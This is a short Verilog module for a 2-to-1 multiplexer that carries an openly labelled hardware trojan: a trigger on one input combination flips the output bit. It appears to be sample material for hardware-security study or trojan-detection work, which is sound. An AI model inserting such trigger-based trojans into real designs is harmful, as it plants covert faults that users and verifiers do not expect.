module mux2to1 (
    input wire a,
    input wire b,
    input wire sel,
    output wire y
);

    wire trojan_trigger = (a == 1'b1 && b == 1'b0 && sel == 1'b1); // Example trigger condition
    wire flipped_bit;

    assign flipped_bit = trojan_trigger ? 1'b1 : 1'b0; // Flip a bit based on the trigger

    assign y = sel ? (b ^ flipped_bit) : a; // XOR with flipped_bit to flip the LSB of b when triggered

endmodule
